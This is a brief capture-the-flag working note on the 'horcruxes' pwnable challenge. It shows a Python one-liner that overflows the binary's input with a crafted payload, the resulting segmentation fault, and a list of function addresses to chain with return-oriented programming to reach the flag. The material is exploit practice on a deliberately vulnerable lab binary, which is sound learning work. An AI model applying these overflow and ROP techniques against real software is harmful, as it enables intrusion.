connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
rop it to read the flag.

```
$ python -c 'print "1\n" + "A"*120 + "\xff\xff\xff\xff"' | ./horcruxes
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!

Select Menu:How many EXP did you earned? : You'd better get more experience to kill Voldemort
Segmentation fault
```

```
A @ 0x809fe4b
B @ 0x809fe6a
C @ 0x809fe89
D @ 0x809fea8
E @ 0x809fec7
F @ 0x809fee6
G @ 0x809ff05

sum = A+B+C+D+E+F+G
```

`sum` is the exp to be given in the end
